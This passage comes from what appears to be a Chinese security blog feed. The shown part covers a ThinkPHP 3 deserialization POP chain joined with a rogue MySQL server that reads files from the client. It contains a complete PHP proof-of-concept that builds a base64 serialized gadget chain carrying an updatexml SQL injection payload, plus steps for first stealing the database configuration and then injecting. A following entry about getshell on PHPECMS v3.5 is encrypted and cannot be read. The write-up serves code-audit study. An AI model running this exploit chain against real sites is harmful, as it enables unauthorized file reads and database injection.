class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;executeTimes++;</span><br><span class="line">        N(<span class="string">&#x27;db_write&#x27;</span>, <span class="number">1</span>); <span class="comment">// 兼容代码</span></span><br><span class="line">        <span class="comment">// 记录开始执行时间</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;debug(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;PDOStatement = <span class="keyword">$this</span>-&gt;_linkID-&gt;prepare($str);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;PDOStatement) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;bind <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($val)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val[<span class="number">0</span>], $val[<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line">            <span class="comment">// 调试结束</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;debug(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === $result) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;numRows = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;rowCount();</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\s*(INSERT\s+INTO|REPLACE\s+INTO)\s+/i&quot;</span>, $str)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;lastInsID = <span class="keyword">$this</span>-&gt;_linkID-&gt;lastInsertId();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;numRows;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数开头第一行先调用<code>initConnect()</code>初始化数据库连接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122004.png" alt=""></p><p>可以通过控制成员属性，使程序调用到<code>$this-&gt;connect()</code>。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122054.png" alt=""></p><p>通过<code>$this-&gt;config</code>里的配置去创建了数据库连接，接着去执行前面拼接的<code>DELETE</code>SQL语句。</p><p>所以这条POP链的功能就在于可以连接任意数据库，再利用delete注入。</p><h2 id="漏洞利用">漏洞利用</h2><p>这个POP链看起来比较鸡肋，因为必须先拿到数据库的配置文件才能注入。但是在MySQL攻击面这篇文章，第一种攻击面就是<strong>读取客户端任意文件</strong>，前提就是伪造一个恶意的MySQL服务端。那么我就可以先把配置文件写成恶意的MySQL服务端，再读取客户端的数据库配置文件，最后通过这个配置文件进行delete注入。</p><h3 id="恶意MySQL服务端">恶意MySQL服务端</h3><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120140208.png" alt=""></p><h3 id="POC">POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>           =&gt; <span class="string">&#x27;mysql&#x27;</span>, <span class="comment">// 数据库类型</span></span><br><span class="line">            <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">            <span class="string">&#x27;database&#x27;</span>       =&gt; <span class="string">&#x27;tp3&#x27;</span>, <span class="comment">// 数据库名</span></span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">            <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3307&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">            <span class="string">&#x27;dsn&#x27;</span>            =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//</span></span><br><span class="line">            <span class="string">&#x27;params&#x27;</span>         =&gt; <span class="keyword">array</span>(), <span class="comment">// 数据库连接参数</span></span><br><span class="line">            <span class="string">&#x27;charset&#x27;</span>        =&gt; <span class="string">&#x27;utf8&#x27;</span>, <span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 数据库表前缀</span></span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>          =&gt; <span class="literal">false</span>, <span class="comment">// 数据库调试模式</span></span><br><span class="line">            <span class="string">&#x27;deploy&#x27;</span>         =&gt; <span class="number">0</span>, <span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line">            <span class="string">&#x27;rw_separate&#x27;</span>    =&gt; <span class="literal">false</span>, <span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line">            <span class="string">&#x27;master_num&#x27;</span>     =&gt; <span class="number">1</span>, <span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line">            <span class="string">&#x27;slave_no&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 指定从服务器序号</span></span><br><span class="line">            <span class="string">&#x27;db_like_fields&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143657.png" alt=""></p><p>然后发送请求，可以在mysql.log中看到读取的文件信息：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143611.png" alt=""></p><p>接下来就是更改POC中数据库的相关配置为mysql.log中读取的到的内容即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143910.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TP3-0反序列化POP链-MySQL伪造恶意服务端&quot;&gt;TP3.0反序列化POP链+MySQL伪造恶意服务端&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Reference: 米斯特安全团队 &lt;a href=&quot;https://mp.weixin.qq.com/s/S
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHPECMSv3.5getshell</title>
    <link href="http://ca0y1h.top/code_audit/PHP/10.PHPECMS3.5getshell/"/>
    <id>http://ca0y1h.top/code_audit/PHP/10.PHPECMS3.5getshell/</id>
    <published>2021-01-10T03:27:32.000Z</published>
    <updated>2021-01-10T03:33:41.012Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ee5df1625aab02c528f1023c4be7accb06825ca117cf20e9a80a9598cce2b731">9b1741d19bc98bca523cf47d84dfbbb085c3cf46a927ce65af6caef4061203a1255f50add100e07c84cd8f7bd5412efdb523521689ac79601c385cf07474556f8feb91c69e0b80014c9b780c49c2203e19068e10338154c0f70c3dd025d246dd5645403f4dd788ca7e8db679c5296e3c17e7ad3b287dbe92c77333f3a1518f4c76151195700c5538777df31773fc983b2d1ca7f53415c047b1745f866cff331950285e5e07784ec6b7830f1035039cc1f44486e7ca13de7e180994333e82a1a432655aa0244cfb7e46b7352a79bded371c690481b16b504e916df50a645e176c9600b80cdadcf455c5cb8f02663eb56393b9a7f2db5bc1f04ceca3ae850263fc97583a2accf35e325813764f9bab4c8791ff9300536ebd3a3fa64198a6946b9a6ea99ffbc27e703c58b0860c1c8e45989944aaf58a8b37fcda80f1511725e6b7490908830fafc36e6c7d9750305542cd68b89932a34f156696c28b1bf61f7f82abbbbc64b93f0098740327839ea6dae1949492c4df6d2a7e2dfcb50d1ac70aaacf8632478650f47e28a40f8872ca7c8609b781a9079d08b35c5c53de48dc5f255d4c9b6310c6d6fe4ac7ef69f2da0016315fd563c746e8d08eb2c292b0923cece7b5ef0fdbb213cb39545f7e0f0bd58546822434caf5f5fe99fb32334ad0bfe9c8bfae85ce7bb90feabd5132c2eaaa9f90aa0fc388927a1a44b989e701f892d86d9670e09640ee4fa0c44aca24efe6bf1e6c16a78447ef9df4951b01244182f5dfdc68bfea0da2a5e3c29ac7abe6ef18a263f6821d0b9d23ee3a3a4d34ebe0506de7aaba3c355dcfabc37f4ca4c04742cd0ab6356767265d18a4bee0b5137b0d1957a22f1b0e71f5ee351e9cfec83df8dde4f5a9474d1fe21d3f455bc96671b2cc28274931fe00b8d57bfd710d373578319d7797e99b64b96b341a2c449411c584b9e24532f47bd697d3a0a549a7daca9d0d6664710cb10cc4b8b5dc9b63d40428c005cf813131bc703cdbbaf8d7f71b1ef971ec93996bb1c61e02fde73b8748aa94871b727f1dca8ab5a94e447e91c13a339be9c5aa6a370c4bbfcbd25c8bc7dbbd9d49eb94dd73fc7cd2095153a437273a0cde7d58edb5a6b3ec7a2b4a6ea20d6dddf0e2ffe3b7f26579f65740ec6cd1506c32727962a9fe164be2212320caff852527352b43c152b4468f1f9aff265904f6761733f018a60f3dd3e043fae7d33fd7ab1681ae711a9f49f3e35d699d02480b548a2f0422eba3546a83e140ff1e5df1669778502efcd6f3562fe594b2a715ffb73a6ffdf3926c4cdc35d9b40f33a2d47fa25bb1da86df93e5fbe75a032d90310c0360f3e37fdbd5ef2a26b7a56b7502a638e528dea906e2501c477a27ff1e5b4698976832568b83830ea50b67d20c46170224fa32950c4617207c55c2cf18771a7683289b35c717ca63f1d4d0c96753f8fca15b6c198883450d20eb102fc62bfc8d7c61f630920e577ab06b809aa0d3860ba989dd1af4832aaee33f098ae51cda93208b4f2d821a68df207ee4b05a2b0331028f7367d3e6c1614cf62790401b72c8bbcc175c89a61f8898ec9f6a95f7f0e6519b5296aab3206ebe7eae6273a615c9696f28c068db77237a26d4a000657f46e8a444245209f3b58fae637a5cda92d56ec08647a8e2a53fa348c0467db638b118cd01f071e767d4f2233f5d8cae9eb02322f82fb9389b5d0e4d32c02c82baa296ef9c343358eba052643e3fc9c60e154d3aa9f55fe64d1893ba011887ab6beec173b43bd0d803b94a6e34d03b5d8393fa6c2259969b568dba72b37be8d1c8ab5d696971f626a51718a1d6129366d301b6015f4162571c685a5da42f8c24676b6c9402e1dc9c625e89fc6ad1a63e20810ee967ee1d2aeda712e88ecb25c6ff5cf4166c31d44100926fb1fbae8d8d8ea92a6fdcd651d99208fbab24cdcbb18bf7b8018f8e8dc7e4c720ed6e3bef94214a4e7550819bd5bd991677b700afadf1182b0c2a37f034d6ea5de7c6b6f27b3eb5f95d986229908e8b3a0a80dfb20e03a8f77e7c90b941df345ad4744631d8552b13eb1c483fe8680a04fdbd7abf1feb1083979089bd381600718f1869b57bf721ff6ba1a359700fa1b20c94060910b0f668fe2fa6f5ca683893e10ea45e513cdc240fd48b9c850eb556de3ecf0f099c49ef607b3e8ce639350a5c43f418f942294b1596a840088b4024b85eb8dffd5507baae25b6dfa27dbc228d20b5cdcd007dfdc4ccba4af9708b8b6d2961f43e1379cb49700ae6751e5854a03a62f732e7e18abdb1a6196b86231c6c93ebc306bc0a344c6ae3318f7349f9902ff4ac0264cef0915e26505c885773855d1002c64ea01397d429be84919550f8333f8ba325c1a7780f8f3046f1fc107d0349e7dfa8c15142b93822a64c7383903085d862b9241752fc8b1a74a9280140749f38f0ff9b16973fa1c6c11b3161e92986e5f90c8824a3c375a8e91379312267e429d9685fa5c75a75cb55730bdd9d12438a72478cde06fea156ed2ae768ad7327d16f8b6edfd14b2b04dbea969cc8a73ec690a0a66a69d5e95b52e615089e2a0592b4361d2ebc1232d0c3b0c74d9f6909d19594f92a78e75bf26a84e0f66bf9c6616a3f305c0201059988243f9de2cc682d975c0a9e1e12e54b8a5e8a86197ec0a7cefdae9403a70b92aa1623af021da2403d165f376f459e931eafb08fddca99fefb6f97af7cc1ccb3a98a60ff91032593da94d3a15d659b541a623b7c5419335ebaad4b46d140130cb73ec7a7b5a4f3c74cc244118e2c98b071f4c75a43c0e88f3d587558dbfa788de602dd4920e504f6e79213cde37f5bbacc489c6c98d6d58dabbd1cb32dfacfcac4884eae3f9d518741bbd1d024881b1cdcf609dba8aa9ceeb3831291f185640f6708149f67c33909cd88fcbd509e6aac18ca9e9227e1c480f24efcb791a2682ba4f1c507f1d836df4ab08be6f90bad69f84021927712f42cc2881cb7b13fb8e058bc2191c7e77a85b017f9e4965af5169b70226bcf08852eda735331532738895eb1b16182eca14159c32d73948c4586a4967eca51c1df03d43ea636443cbee884a5d0ef9601bd54df9a642e6bea455bb367f975873a1e7ad63d95e46dde43056419d0c3124548b738181edf7374ff95734506c4c4021777598d3d470caa0c21c41a24f90238eb0b799d31bf91b6810332439ff360dca30a33d0491c9aacf6d5fd37e34d697594ae73f452b5d060844214126bee7b35a3ba2cce6cec8932ba0e77250b2eb69427b4685acf687ae1da1d1511b634f078557cf89372fe4e2f2104f3d35f786619ed5db79a4b987d252ced43586da538a8981d976c546c72654caeb6f549a313097758d6c2dad69f8606e6309c6c923c79ac5fc246d94b8c44aee4747ea8096d42a180893f4277a74ccc79b1924e1c179b40e3e3ee25ec5dc12a48d7c388f3fb7656610d2422416135d1162a06541fa6f91761e9b7d86f2badcbb5443f6719b44798e7056ced036ad876083d2e0256fc59b4f43c7a15efce84daa7cb16faaab6a25766a7793e38da4be7173de59859ea3f7839eb550edb86c95388c0366d62d0a7cbc5465d6150101403acb0c6fc1a63eb056090e2a56014ce301b302df6a804e0cc6c2b569c875f5e566d64cdcf0d4ce3db73c210728176e9ee33d5f82c01bb97b3743521215c94e5262fd79c7d100a7d02faa7276be5fd64c32e1fb6af42f0a93db13aab562aebf4ea20740da29fc705c3f76ab1752cb1f205924d421437a8ce186838ab21959c6db5b8b1b08bae1a0bf31f254ebe5cd3cbbadbe07621f86c06cb23a37b556d7361aa661a73fe7e28f1322331242ffb0fbed2a9c76ba6c6d44e7a59a0f6f8c68acb0d8af40c99194c0530f0ef2aa9b833af18ce1fc351a682e827fd5a6a514039a900ae267fefc73d09c518dc668f7a3ca9a702e80a6f7b3b45ed0a71aafd45c55494d149d5d9dfbe1f72c09f19bfc87b743d646980c2b6d2ced37b7a53dcab9afb7f4e13d7f62cca3628547bd78bd1c67e19317a2edcf293a8a8f8c6a2c1c3d2140a06420febd0b479665ce6dc06a4f5ef61951f369ddea2f52227103f89342e0070b572ce49e470e503ce8b5ac16f4b068959374f15291431187ed2732c167192268f412b99d7ada44175f02a01bbac69aa7ab63abd52406ce6cb7ee73dca6675f7544775b939787775f7d62beed965cc7d1c622091ec0f38e067b4c2f7dc72506576a3ca5a67035f7bf5e0cbc8a0af11a9695e242da59487ce107c29153d41718c1ccebb1689298ef60a75e2626db985fcf3b139c065367bcaa2dc45b24c9e94252e8dedc1d37f90c677b56bf41a472b7b5ad4f53bb674390223b7ed7d31d4982e7dd1fa1d3523baccc2114c9e0dd08a44570d291ce3df1ffeb43ea83c5d72d13f9d3de90b342656a0c844a6825419a4502288e73f21e3c5e4c3c90069c5179b2c9f936f8624db8aaf056ed7e52571b3fdab2f78ebe16aa381a4c45faf2da4c745b826008d418d78d99048c10a929d00679aeea25b05d4ada4bd752ee70019881bd289f907f6c57b714d97a971027bdd37a330b1a502f1733821b1de14a920d38ef491fdb9508e3a0f9f6348b0b3513f3a52c3177e09332a6485013ee25c4a079389cf5c5193fc3b404cb2baf8252daa825c0dac5ea947a4a0ad5a9d6295f1295cb3420d3175f1820f3a30f70dd616c1a79129531d66ab9e1cb274dfd9314953e9968e472cfba4f3344052e5bd89b7eef33f4e731b812e4b66c2c159c3b0b05d1bf20f95c846b8437a4c11f485decac4c3b5c4b83065db8a7813d69f6ded389202dbf04e5ed4f8c7c9377892616c69f4e9f0999fe9c6f484000eaf32bedd0275f6954be81a29c39f2b3b28803afbca0f1a007a4c57b958c82bf892634b803b61ed97ff632af7bc3502228857235bb4d0a918c503412eb40fbc858cf261eab1991807a838bc2c120184324760c7ac95d301786fd74d072a586ebcadb98641105709a697035bb2577f888deeaffd17819a4cdacd33000a65b30cd06d04f1f347c03f56dc1a432c9d5edcb211d942b29a9d0ecb5347a2ccdd5dad1ca730da407831436828be238fc63fd35ddb4858c12b66b78cdc263939d54089943387de1cccceddbd440b711d69f201d77e8741f8494dbc61488392f45b7364be2c41d1389c1a9daef8be3dc3bc52593b55fc8d96e025050d71708979224096dcc78e691a6fd718fa8249bb56610233af7e13aa88c732bfbfb77e18552b19f7269a320a8fde62fc9763d58118e5b608bdf296bd4390a4ebce194b67fb02098559815d220a067368f597a529a281eb3c09a05e24529a7431f203d445eb8c14d272774affb102967b0512b7d7dcbd8e48a656c38955eb81a1c7cfef5b6ae4332e34a7d40c7c8c455a48c42c5d400bf36021eb48cd3785eb4c2bb8eeea66dde6b56d6b3555e48b8fb0a32a9005282cfd7c003691a3b50476532bb1a394bda3b5db28df8d374595c0f9c35226d929e54cab3d5445b61387d19c22cdd9a13a8ed1eb57e1425d1c941e64da9a146fb74fee6ede73a041425c97b467739653eb44d250a0fcea86cc4e2f777a7e89221369634f1ccc1fd38af22dea8dcbe8f6af25fafe3525cc3fc0e77418b410eaa67497dacd4658c1716feb34449b12a79ec4851f4331d0fd1858f277d111ae07fc4500cb58cf75d159ce124b82b0184950e493140bcedf2085ce1ce2935c7f91434aaccd573d01a95c11776e59c2519b8a4600f8325138096db14d7b601199055f2296f8aa03101cf65fd711e53dbfb15b0ead4a0b028595d037d83710e11bf5f478963cc48b5cb6f401fb328cb99c51ec7b9d57db4dbbf9736c8e23b598ee7e4d092b57efc96280499ae6ea9d5485729a1d251885770a96b9eb0d68d3211dace150956fcb9a26202e4864f74093d0f18fcced6898350f1a9473f7518a2ead7f8204dd475173017dd0f457e199232874e720af67c27fc90ecf4e376c50d21d924e805373e753abf0b50731f685ed4cf09483a201ab4a99751e284252a4fb0d4c0ba5eb96355f7f4fefc791ed937bfcce815f29659fc4ecbd711ddb36ac35e3bdf0a1fd5ab2965210d0a052d85c9db598c7dbcfbd13211918750702d84a91faca44dbe7d145f9972bc274e408fff78ec7eb50f7c0f5c84cba3e7924b4a498643196ba7e34e6a7e60c864da64b5c18b25116bfa256299d34ded3d0f3d037598b6fc59883c3844c01113dd2b6c6f0ab67d2c77a289a266b30ac9259a20960fabebce9da84fa8d9c3ffa36e2d93027d53fd9fc879531b67b13ad54f9c927e583959f0092598ac197e561257142dacddb177e3cb34df6caedd3667a4bfbb6bc59c5945aa458b7442df44f47cce1bd24e744d3077ca7cd46343d6f769309c7a21da837eae617647bd49b54be039792f3da1f03e59947fa8c18ba7965773101e4f9f91c4708b795081f29947d1c6585325662f721ee793c5003c3612081e42315aedb4c2797494d84111ca969cb113343316bfcc93c58932ec1301b80b9ac5789a8218d3bf091fac2a3c5ee8cce8e7908b698374ebd1dc7510ecaecda3fc9f54b6b011aa3de7eadfde5febb5836e5c984972228d0779730a10dc51a8dd329e3e533254544eab13d39c97f449744ca9b9e761a78700db5ee3cadbd4dacd01180d9e6dac27b9d40005a3fb9e63d27a5b204a3ba25c4c7e2a5f928e91e4232896246ab7675ffc1a83da19f313356627034082a4c76253f2c13eb30c310498342c36860b5bc99fa50b1c70871c06996004fc879b914e8f87a4880716467c70662ad89b1c9814648dca491071bef865c0c6d9786edfd958b1cc75cc741527488a8716fe500297bca66a14fa960d0e85e8c706a84e87e74cf3854c35418de0a17e3a9e705604cce95c6db1aed5831cca0f76f2576dd74678b43d330a2a7fb3bf32465140bda451c090d1d038b196f8e5bc5fdd1b8ec16594924172923799982ccbd7fd27f82f82b0f22e6a5861526b972aa7dd82426e970b90f5ed908321435d6f343bde808f40baea84e6d45a712f40ddf016ab9964b9cc3acac81195a969b3f2edbc4175201bd509ccabff81ec3fd02d6cc1e9428a1b1c1d5a82f0ec3855c09582efbe593e83ac75f62df147132ad429e96f1c1501bedf00f3503c18a532643c453c5fd17652cc072d7eed4ba4acdab3d7a21d5525d98ae7a71a7189254310bb5a6990a96d9a3ca6325de40a415f556a0c9a4fb15e13e87c2fa2d208922d9d93f6c9d0fbdb6a5f36932a6c95ba486e4c875faeb89c3690923b4576455f4dbe1865f4a498fc8ead6ecf04647b2b5136be59e229baf4add25f8a99c8075e4147c26bee8ce6d79c8b0eb9e90c3bd6978c9641190efb20a2229d469f54c18ae887b2d2eebb7014c67b415b4a235808b64858f47c1bc6d7122e44a596eb991991a396303b7f6f3f5eb57bce5124b1795e6c32546b1a124b3db9dc31933f1b3ed4a24ea23f36d1ac6153be558a03264bc5b167e80378c6b8cc3e7a09d089c1e4a01a1dfe06121f3621b2faef4caaa74173c29f3f6fee2e845a55daafe44c31ca6b87ce7e85968baee28af3227e3690f5e0808587578059ae4695402cfbe3f9e11626d69a6a49f9f23c8922d9a42d2a14e2788f48a0e21205534ba487c93d5b4ca9b6fdf0fbedac6b62747e4534d95dba304c863aa6d6fd300a7b581ed687253aeee15a0e76c782e7b165a5f500105bf5ac9727a73880ed552e154c53e0322e297c3e9a5cd26024acb757cc7e337b8dde695ac8ca7b071ea49db82994d8e7a80fbfb66feee8365f0aed43a960f0b5d52b11af4dbecf37306d8497fdf11eb09afa317188e9e87961ce4d972975ec1e7f4fb5e9f906db2c73da6aa8fa63129e96c0004da9faf923f4fc2f644150e7943614c8abfa2efd0cf54ba71a971f1cb11703191550cc6141e6211fb474a20bbaee5f3cac9311b9846b24ed4a2d3b7f0171081db01a32597393ebcffca137e18ed6aa91dfb46b3417f6e687d8321daa7fe93987f6ca4b09702f055e6ad4022d11e7480da88d4b8435101ab0b5869d1b5a04c9ab5131d2b7699197262ae6445966fdc7b9f9b4e1f3db58f6ae5ffbb6763f4086eb15d8510541407485133f5f6acd97db393768bd1d2efd4fb6b4570eb61d9354e3ee5387962d41de45840c116559621078a19da709bee5d615df65fd1f1201c5c46588d6478133c680e8d48730175297f83f8844d4c93963c6d9dacc3088f62acf802e865f643c899009fac3d8db167215352a18620faa572195ce2